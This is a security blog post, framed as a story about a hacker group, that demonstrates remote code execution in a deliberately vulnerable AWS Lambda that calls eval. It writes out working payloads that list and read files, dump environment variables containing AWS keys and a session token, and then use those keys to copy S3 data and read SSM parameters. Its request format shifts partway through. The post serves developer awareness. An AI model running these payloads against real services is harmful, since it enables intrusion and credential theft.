---
layout: post
title: Steal This Lambda!
author: juhofriman
excerpt: AWS Lambda is an amazing service. Underlaying platform is really secure, but it still leaves lot's of responsibility to you. Your code can still be vulnerable. In this post I demonstrate what malicious attacker can do with remote code execution in AWS Lambda context.
tags:
 - AWS
 - AWS Lambda
 - Serverless
 - Security
 - Software Security
 - RCE
---

# The Story of the Stolen Lambda

Once upon a time there was a company called **Acme.corp**, which had managed to generate revenue leveraging AWS Cloud and especially AWS Lambda computation platform. **Acme.corp** had a rather small development team, but they had managed to really embrace devops-culture and they felt they have everything sorted out. Developers of **Acme.corp** were super satisfied with AWS Lambda, as it practically zero operational overhead platform and most of all *secure*.

**Acme.corp** had a product that renders messages with given parameters. Their service could be used in email-marketing, content management and allmost everything bright human mind can think of. Their API works like this:

{% raw %}
```bash
$ curl -X POST \ 
  -d '{ "template": "Hello {{=it.name}}! {{=it.greeting}}", "vars": { "name": "Jim", "greeting": "Good to see you!" }}' \ 
  https://12289grzk7.execute-api.eu-north-1.amazonaws.com/dev/do-some-work
{
  "response": {
    "message": "Hello Jim! Good to see you!",
    "sealsOfApproval": [
      "ACME.corp"
    ]
  }
}
```
{% endraw %}

The client sends JSON payload with `message` and `vars`, which then gets rendered into a single message. Then they also add `sealOfApproval` to really make it clear that this is a `Acme.corp` rendered message.

*It's amazing, of what people can make money nowdays!* - I hear you thinking. But let's get back to the story, shall we?

But there is another group in this story. The **eLite-CrEW** hacker group. There has been rumors that they are connected to state-level actors, but I guess we'll never know for sure. They wander in the shadows and lurk inside switches. They hide in non-terminated forgotten cloud VM:s.

And just when the **Acme.corp** started to see some light after long and hard invest round, there was dark clouds rising in the background. **Acme.corp** did not have a clue, but the **eLite-CrEw** had found a RCE (*Remote Code Execution*) vulnerability in **Acme.corp** API.

One misty morning (UTC time), the **eLite-CrEw** sent this payload as proof of concept to **Acme.corp** API.

{% raw %}
```bash
[eLite hax-term] $ curl -X POST \
  -d '{ "template": "You have been: {{=(function() { return \"PWNED\"; })() }}", "vars": {}}' \
  https://12289grzk7.execute-api.eu-north-1.amazonaws.com/dev/do-some-work
{
  "response": {
    "message": "You have been: PWNED",
    "sealsOfApproval": [
      "ACME.corp"
    ]
  }
}
```
{% endraw %}

This called for celebration in the deep underground dungeons where **eLite-CrEw** hackers supposedly lurked. The exitement spread through reverse shells all around the globe when group members heard about the newly discovered vulnerability. They had managed to execute code in **Acme.corp** machines. And if you can execute code somewhere... The world is your oyster!

Because **Acme.corp** has been developing cutting edge technology, they haven't yet talked openly about their platform internals and they haven't published that they leverage AWS Lambda. So **eLite-CrEw** did not know, that they are executing their payload in AWS Lambda. They saw from response headers that the run on AWS and have CloudFront set up in front of API.

```
HTTP/2 200
content-type: application/json
content-length: 111
date: Mon, 14 Dec 2020 11:15:40 GMT
x-amzn-requestid: 87dca01d-af97-48a2-8bad-8db428ae5485
x-amz-apigw-id: XihmeG-gAi0FXtA=
x-amzn-trace-id: Root=1-5fd7495c-203911bb661202dd42fa1f06;Sampled=0
x-cache: Miss from cloudfront
via: 1.1 51b6f8f9e6a4ed138b0c486aecbc264c.cloudfront.net (CloudFront)
x-amz-cf-pop: HEL50-C1
x-amz-cf-id: dn4Q6xnwoLoCTO7mRWHwtX_GpAs1WjhGt8VeFXpwD2PYVlVXN9Q9QQ==
```

**Gargoyle**, the seminal hacker in **eLite-CrEr** started to work with the newly found vulnerability. They carefully tested out payloads and found out that this does not work, but instead returns 500 error.

```json
{ 
  "template": "{{=require('fs').readdirSync('./')}}",
  "vars": {}
}
```

Sweat started to rise on **Gargoyles** forehead because they had introduced a error, and it just might be that **Acme.corp** found out that they have been hacked.

Then the **eLite-CrEw** implemented a simple program which they can use to exploit vulnerablity more easily.



# Steal This Lambda!

AWS Lambda platform is simply ingeniously engineered platform for running your code with almost zero operational overhead. It's performant, scalable, easy to use and most of all secure. But even if you leverage AWS Lambda runtime, it does not make *your code* secure in any way.

RCE (Remote Code Execution) vulnerabilities can be really scary in AWS Lambda context and to me, it feels that this hasn't been addressed that much in security community.

This post deals with API Gateway invoked Lambdas, as in that context you have to prepare for any possible payload. This is not the case in internally invoked lambdas such as SQS processors, because you can usually manage payloads more easily.

But when it comes to HTTP invoked lambdas... You can get anything executing on your environment.

We don't cover actual RCE vulnerabilities. Instead, we just have **really stupidly** implemented service which I use to prove my point. But the bottom line is, that in lambda context, if a malicious user gets to execute shell... you're toasted. The blast radius depends on how you have set your environment.

Let's cover this issue with a small story. We have **Acme.corp** team which produces an application and runs it on AWS Lambda. Then we have hacker group called **eLite-CrEw**. In this story you see from terminal colors which group is executing commands: standard terminal is Acme.corp and scary looking red terminal is eLite-CrEw.

## Acme.corp Application

Acme.corp has developed an application which renders messages with variables for their customers. Trust me, they make serious money with this service.

Acme.corp API works like this:

{% raw %}
```bash
$ curl -X POST \ 
  -d '{ "template": "Hello {{=it.name}}! {{=it.greeting}}", "vars": { "name": "Jim", "greeting": "Good to see you!" }}' \ 
  https://12289grzk7.execute-api.eu-north-1.amazonaws.com/dev/do-some-work
{
  "response": {
    "message": "Hello Jim! Good to see you!",
    "sealsOfApproval": [
      "ACME.corp"
    ]
  }
}
```
{% endraw %}

The API receives JSON payload which contains the template and vars. Then it substitutes placeholders in template with given variables. It's amazing how people make serious revenue these days!

## Enter the eLite-CrEw

All you security savvy readers already know where this is going... Yes, the API has RCE (Remote Code Execution) vulnerability, and the eLite-CrEw has found that functionality. This is their proof-of-concept payload.

{% raw %}
```bash
$ curl -X POST \ 
  -d '{ "template": "You have been: {{=(function() { return \"PWNED\"; })() }}", "vars": {}}' \ 
  https://12289grzk7.execute-api.eu-north-1.amazonaws.com/dev/do-some-work
{
  "response": {
    "message": "You have been: PWNED",
    "sealsOfApproval": [
      "ACME.corp"
    ]
  }
}
```
{% endraw %}

And there you go. Acme.corp is toasted, PWNED, finito and done. You can clearly see, that the lambda evaluates given function because rendered message contains only string `PWNED`, not the literal function.

No eLite-CrEw can dig in deeper. Because they know that it is Node.js they can use all the tooling Node.js has out from the box. This took some time for eLite-CrEw to find out, but this is the way to execute functions in Node.js `fs` module with Acme.cort vulnerability. The problem was that payload with `require('fs')` did not work, but instead threw some errors. Let's hope Acme.corp does not have good monitoring set up, or otherwise eLite-CrEw might get compromised!

But this works.

{% raw %}
```bash
$ curl -X POST -d '{ "template": "{{=JSON.stringify(process.mainModule.constructor._load(\"fs\").readdirSync(\"./\"))}}", "vars": {}}' https://12289grzk7.execute-api.eu-north-1.amazonaws.com/dev/do-some-work
{
  "response": {
    "message": "[\"README.md\",\"handler.js\",\"node_modules\",\"package.json\",\"passwords.txt\",\"yarn.lock\"]",
    "sealsOfApproval": [
      "ACME.corp"
    ]
  }
}
```
{% endraw %}

And eLite-CrEw has managed to list files in Lambda. Then they use **jq** to process and read responses more easily (`MALICIOUS_PAYLOAD | jq -r response.message`). From now on, I just present the javascript payload and corresponding JSON response.

Let's see what `README.md` contains.

```
JSON.stringify(process.mainModule.constructor._load("fs").readFileSync("./README.md", "utf8"))

->

"# Intentionally RCE Vulnerable AWS Lambda\n\nFor your eyes only."
```

`README.md` can contain suprisingly sensitive content, so make sure you don't package that, or any other development only purposes file, to the actual package. This contains just "For your eyes only", but it could contain anything. You name it!

One interesting path in AWS Lambda is `/opt`, because AWS Lambda mounts Lambda Layers there. Lambda Layers are practically static mounts of files. You can add code to layer, but also certificates and keys and what ever. But eLite-CrEw did not find anything interesting there.

## What Does this Lambda Actually Do?

It's trivial for eLite-CrEw to steal Acme.corp code.



Of course, we can step out from the application context, and see what the underlying fs (yes, there are servers) has.

```
curl -X POST -d '{ "calculation": "require(\"fs\").readdirSync(\"/etc\")"}' https://12289grzk7.execute-api.eu-north-1.amazonaws.com/dev/do-some-work
{
  "countOfThings": 2,
  "result": [
    "DIR_COLORS",
    "DIR_COLORS.256color",
    "DIR_COLORS.lightbgcolor",
    "GREP_COLORS",
    "X11",
    "aliases",
    "alternatives",
    "bash_completion.d",
    "bashrc",
    # Omitted for brevity
```

Nice `/etc`! But that is just the lambda container runtime. I'm pretty sure it does not contain anything exploitable. If it would, Amazon wouldn't let us run our code like this. They know these things. They know we make vulnerable software and run it on their platform.

This is just stupid vulnerability and actual RCE vulnerabilities are much more subtle (you don't use `eval`, right?). The attacker can do and utilize all the tooling - reverse shells and such.

But there isn't that much to do with that huge pile of virtualisation. Because AWS Lambda usually don't have anything interesting in filesystem, like passwords, usernames and whatever statefull data. You usually can't jump to other machines or whatever. This is why the standard RCE reverse shell is not that interesting.

## The Scary Part

I mentioned that you shouldn't package any additional files to deployed package. But you can't omit the code. So now the attacker is willing to see what the Lambda actually does.

```
$ curl -X POST -d '{ "calculation": "require(\"fs\").readFileSync(\"handler.js\", \"utf8\")"}' https://12289grzk7.execute-api.eu-north-1.amazonaws.com/dev/do-some-work
{
  "countOfThings": 2,
  "result": "'use strict';\nconst AWS = require('aws-sdk');\n\nvar s3 = new AWS.S3({apiVersion: '2006-03-01'});\nvar ssm = new AWS.SSM();\n\nmodule.exports.doThing = async event => {\n\n  const request = JSON.parse(event.body);\n  const result = eval(request.calculation);\n\n  // Fetch data object key from SSM\n  const dataFile = await ssm.getParameter({ Name: '/steal-this-lambda/s3-key' })\n    .promise()\n    .then(p => p.Parameter.Value);\n\n  // Fetch the data from S3\n  const s3data = await s3.getObject({ Bucket: 'steal-this-lambda-data', Key: dataFile})\n    .promise()\n    .then(result => JSON.parse(result.Body));\n  return {\n    statusCode: 200,\n    body: JSON.stringify(\n      {\n        countOfThings: s3data.secrets.length,\n        result\n      },\n      null,\n      2\n    ),\n  };\n\n  // Use this code if you don't use the http event with the LAMBDA-PROXY integration\n  // return { message: 'Go Serverless v1.0! Your function executed successfully!', event };\n};\n"
}
```

Prettty unreadable, but hey, pour in some `jq`.

```
$ curl -X POST -d '{ "calculation": "require(\"fs\").readFileSync(\"handler.js\", \"utf8\")"}' https://12289grzk7.execute-api.eu-north-1.amazonaws.com/dev/do-some-work |jq -r '.result'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1095  100  1021  100    74   3347    242 --:--:-- --:--:-- --:--:--  3590
'use strict';
const AWS = require('aws-sdk');

var s3 = new AWS.S3({apiVersion: '2006-03-01'});
var ssm = new AWS.SSM();

module.exports.doThing = async event => {

  const request = JSON.parse(event.body);
  const result = eval(request.calculation);

  // Fetch data object key from SSM
  const dataFile = await ssm.getParameter({ Name: '/steal-this-lambda/s3-key' })
    .promise()
    .then(p => p.Parameter.Value);

  // Fetch the data from S3
  const s3data = await s3.getObject({ Bucket: 'steal-this-lambda-data', Key: dataFile})
    .promise()
    .then(result => JSON.parse(result.Body));
  return {
    statusCode: 200,
    body: JSON.stringify(
      {
        countOfThings: s3data.secrets.length,
        result
      },
      null,
      2
    ),
  };

  // Use this code if you don't use the http event with the LAMBDA-PROXY integration
  // return { message: 'Go Serverless v1.0! Your function executed successfully!', event };
};
```

And yes. Now we can see what this weird service actually does.

1. It uses `eval` to payload
2. It fetches a parameter from SSM Parameter Store
3. It fetches some data from S3 using SSM parameter value as key
4. Then it counts something from the data in S3

And it looks like the team has forgot to remove scaffolded serverless code.

### Some Theory About AWS Lambda

Have you ever wondered, what actually happens when you grant your AWS Lambda a priviledge such as allow reading from S3 bucket? Here is an example from this vulnerable application, which leverarges Serverless framework.

```
- Effect: "Allow"
  Action:
    - "s3:GetObject"
    - "s3:PutObject"
  Resource: { "Fn::Join" : ["", ["arn:aws:s3:::" "steal-this-lambda-data", "/*" ] ]  }
```

This merely passes priviledges to Lambda's Execution IAM Role.

But how does Lambda know what it can do and how do other services validate that received API calls are authorised?

The answer is **access keys**. We won't dive into deep details of STM, but get this. Our attacker executes:

```bash
$ curl -X POST -d '{ "calculation": "process.env"}' https://12289grzk7.execute-api.eu-north-1.amazonaws.com/dev/do-some-work
{
  "countOfThings": 2,
  "result": {
    "AWS_LAMBDA_FUNCTION_VERSION": "$LATEST",
    "AWS_SESSION_TOKEN": "IQoJb3JpZ2luX2VjELL//////////wEaCmV1LW5vcnRoLTEiRzBFAiB0rBuGjEdevTvya+iHcpCLjTdhW4ezKZGrLYg3cpfKkAIhAP4OWZOgRxAjGulDVyOQSs2vMyJ+CkSoHY3XI3ixEkGPKtwBCEsQAhoMNjM0MjE0MTc2NTcyIgzvr7HPtJtejP1oPrUquQEmvXac7m0MAA54ZAafDrvJKDwJMmgxzxWpaTCvY5EOOjB17118yGa1gjh7Sgig2f1GEOgVkBaTrNA+dGuI7pO6gWN+MqWajZHX3VvaatFa3+J1N7D+JHI1NjtHz+CTb8cp13WQsCKNCyxMxREWALcAAH0aDnShHoK0k96bhVpPy1cPDd7uX/lBBMWlClBdwjyNMY3I5LfbP83KAuXYi1N6TyEu1yfQLZuXXpO6BSRhvVK0jMajHe/YvzDt/r7+BTrgAW3QbkGoYPz5LzE2p9HcWXlnYdbmxFqWwep4F1LizibZPIld8uNqYxxoHMaXafEa5bn7/jW99Os0H7Y9IhrF3TyF5rg1XntYP2hs5acc4+KCQm4a3qtybcQfWXxFtkmm7hixfar+dl4T+IPwqyQIrek8hDxb9p19bMaK7g239kqgdtqIMYC2AcGkT+56Id7loummjyCCSJkMlRkdhmqtv78FTVVFfX2UB8U4d+Nr1W/bykShTSzxYLG3jHMffBhn9R5OHo102zu35WF280x7T/ctLXqye2vCx7a7QPrhpBYF",
    "AWS_LAMBDA_LOG_GROUP_NAME": "/aws/lambda/steal-this-lambda-dev-doThing",
    "LAMBDA_TASK_ROOT": "/var/task",
    "LD_LIBRARY_PATH": "/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib",
    "AWS_LAMBDA_RUNTIME_API": "127.0.0.1:9001",
    "AWS_LAMBDA_LOG_STREAM_NAME": "2020/12/08/[$LATEST]484df39ef3344a5a93f3554e9a273f48",
    "AWS_EXECUTION_ENV": "AWS_Lambda_nodejs12.x",
    "API_SUPER_SECRET": "this-is-secret!",
    "AWS_XRAY_DAEMON_ADDRESS": "169.254.79.2:2000",
    "AWS_LAMBDA_FUNCTION_NAME": "steal-this-lambda-dev-doThing",
    "PATH": "/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin",
    "AWS_DEFAULT_REGION": "eu-north-1",
    "PWD": "/var/task",
    "AWS_SECRET_ACCESS_KEY": "isFhtfx3rD8aesMJ9D9hJHMjyBeD3BYUVXontJpu",
    "LAMBDA_RUNTIME_DIR": "/var/runtime",
    "LANG": "en_US.UTF-8",
    "AWS_LAMBDA_INITIALIZATION_TYPE": "on-demand",
    "NODE_PATH": "/opt/nodejs/node12/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task",
    "AWS_REGION": "eu-north-1",
    "TZ": ":UTC",
    "AWS_ACCESS_KEY_ID": "ASIAZHKQ4K46PXTKTZBS",
    "SHLVL": "0",
    "_AWS_XRAY_DAEMON_ADDRESS": "169.254.79.2",
    "_AWS_XRAY_DAEMON_PORT": "2000",
    "AWS_XRAY_CONTEXT_MISSING": "LOG_ERROR",
    "_HANDLER": "handler.doThing",
    "AWS_LAMBDA_FUNCTION_MEMORY_SIZE": "1024",
    "_X_AMZN_TRACE_ID": "Root=1-5fcfc82e-5e61360f337c143d59497071;Parent=130947c94d0b5eaa;Sampled=0"
  }
}
```

We have additional `API_SUPER_SECRET` exposed but we don't actually care abou that, because now we're totally screwed. See `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` and `AWS_SESSION_TOKEN`. Because now attacker can dig in deeper. They know what services Lambda is at least able to use.

The code was referring to S3 bucket `s3://steal-this-lambda-data`. Let's see what it contains!

```bash
$ export AWS_ACCESS_KEY_ID=ASIAZHKQ4K46PXTKTZBS
$ export AWS_SECRET_ACCESS_KEY=isFhtfx3rD8aesMJ9D9hJHMjyBeD3BYUVXontJpu
$ export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjELL//////////... omitted for brevity
$ aws s3 ls s3://steal-this-lambda-data
2020-12-08 15:34:18         65 data.json
2020-12-08 20:49:09         47 passwords.txt
```

Cool. Passwords!

```
$ aws s3 cp s3://steal-this-lambda-data/passwords.txt . && more passwords.txt
download: s3://steal-this-lambda-data/passwords.txt to ./passwords.txt
This file contains passwords, such as kissa123
```

The team has made some countermeasures. The attacker can't list all SSM parameters.

```bash
$ AWS_REGION=eu-north-1 aws ssm describe-parameters

An error occurred (AccessDeniedException) when calling the DescribeParameters operation: User: arn:aws:sts::63421XXXXX:assumed-role/steal-this-lambda-dev-eu-north-1-lambdaRole/steal-this-lambda-dev-doThing is not authorized to perform: ssm:DescribeParameters on resource: arn:aws:ssm:eu-north-1:63421XXXXX:*
```

But they can read it.

```
$ AWS_REGION=eu-north-1 aws ssm get-parameter --name "/steal-this-lambda/s3-key"
{
    "Parameter": {
        "Name": "/steal-this-lambda/s3-key",
        "Type": "String",
        "Value": "data.json",
        "Version": 1,
        "LastModifiedDate": "2020-12-08T15:53:17.337000+02:00",
        "ARN": "arn:aws:ssm:eu-north-1:634214176572:parameter/steal-this-lambda/s3-key",
        "DataType": "text"
    }
}
```

 Note, that this parameter is **encrypted**. It might be API-key, private key, database password or whatever.